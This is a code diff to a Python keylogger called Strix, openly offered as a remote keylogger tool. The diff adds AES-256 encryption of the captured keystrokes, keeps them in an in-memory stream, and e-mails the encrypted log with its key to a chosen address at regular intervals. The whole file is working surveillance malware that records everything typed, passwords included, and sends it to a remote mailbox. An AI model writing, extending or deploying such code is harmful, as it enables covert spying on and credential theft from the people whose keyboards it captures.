@@ -8,28 +8,46 @@ from email.utils import COMMASPACE, formatdate
 from email import encoders
 from pynput.keyboard import Listener
 import threading
+import pyAesCrypt
+import io
+import secrets
 
 '''
-Key logger that saves keystrokes to log.txt file in the local directory, and e-mails this file regularly to a specified e-mail.
+Strix is a remote keylogger tool. Running it saves keystrokes to a stream.
+At regular intervals, the stream is saved to an AES-256 encrypted file "log.txt.aes" and e-mailed to the e-mail address provided.
 
-USAGE: python strix.py < e-mail address > "< app password >" < time interval>
+Usage: python strix.py <E-mail address> "<App password>" [Time interval] [32-bit Encryption key]
 
-EXAMPLE: python strix.py johndoe@gmail.com "asa fgh aaa" 120
-Assuming john doe created an app password whose value is "asa fgh aaa" from his Google account settings, and decided to send the log every two minutes
+Args:
+    - email (str): E-mail address to send the reports to.
+    - appPassword (str): A generated app-specific password for authentication.
+                Your E-mail's password does not work. For more information, visit https://support.google.com/accounts/answer/185833?hl=en
+Options:
+    - timeInterval (int): Number of seconds in between every other e-mail sent. Default = 60.
+    - key (string): 32-bit encryption key for AES-256 encryption. Changing the length of this key changes the encryption strength.
+                If unspecified, the randomly-generated password will be e-mailed with the report.
 
-NOTE: for authentication to work, the password you provide must be an app password, and not your e-mail password.
-For more information, visit https://support.google.com/accounts/answer/185833?hl=en
+Example:
+    python strix.py "johndoe@gmail.com" "your_app_password_here"
+    python strix.py "johndoe@gmail.com" "your_app_password_here" 60
+    python strix.py 'johndoe@gmail.com' "your_app_password_here" 60 "0123456789abcdef0123456789abcdef"
 '''
+
+BUFFERSIZE = 64*1024
 
 class Keylogger:
 
-    def __init__(self, email, password, interval):
+    def __init__(self, email, password, interval = 60, key="0123456789abcdef0123456789abcdef"):
+        self.logger = ""        # Keystroke stream
         self.email = email
         self.password = password
         self.interval = interval
+        self.key = key
+
         self.logFilename = "log.txt"
+        self.encryptedLogFilename = self.logFilename+".aes"
         self.emailSubject = "Keylogger Report Email"
-        self.emailBody = "Find attached the Strix keylogger capture."
+        self.emailBody = "Find attached the Strix keylogger capture, encrypted using AES-256 with the following key {}".format(self.key)
 
     def appendToLog(self, key):
         keyData = str(key)                  # If you type the letter f, then keyData saves the value 'f' with single quotes.
@@ -129,10 +147,18 @@ class Keylogger:
                 keyData = "[UP ARROW]"
             case _:
                 pass
-        with open(self.logFilename, "a") as log: # Opens the file if exists, creates it if it does not. Opens in append mode.
-            log.write(keyData)
+        self.logger = self.logger + keyData # append to stream
+        # with open(self.logFilename, "a") as log: # Opens the file if exists, creates it if it does not. Opens in append mode.
+        #     log.write(keyData)
 
     def report(self):
+        streamData = self.logger.encode('utf-8')
+        self.logger = ""
+
+        fIn = io.BytesIO(streamData)
+        with open(self.encryptedLogFilename, "wb") as fOut:
+            pyAesCrypt.encryptStream(fIn, fOut, self.key, BUFFERSIZE)
+
         self.sendMail()
         timer = threading.Timer(self.interval, self.report)
         timer.start()
@@ -142,7 +168,7 @@ class Keylogger:
         sendTo = self.email
         subject = self.emailSubject
         body = self.emailBody
-        file = self.logFilename
+        file = self.encryptedLogFilename
 
         message = MIMEMultipart()
         message['From'] = sendFrom
@@ -174,6 +200,15 @@ class Keylogger:
 if __name__ == "__main__":
     email = str(sys.argv[1])
     appPassword = str(sys.argv[2])
-    interval = int(sys.argv[3])
-    keyLogger = Keylogger(email, appPassword,  interval)
+    interval = ""
+    key = ""
+    if len(sys.argv) > 3:
+        interval = int(sys.argv[3])
+    else:
+        interval = 60
+    if len(sys.argv) > 4:
+        key = str(sys.argv[4])
+    else:
+        key= secrets.token_hex(4)
+    keyLogger = Keylogger(email, appPassword, interval, key)
     keyLogger.start()
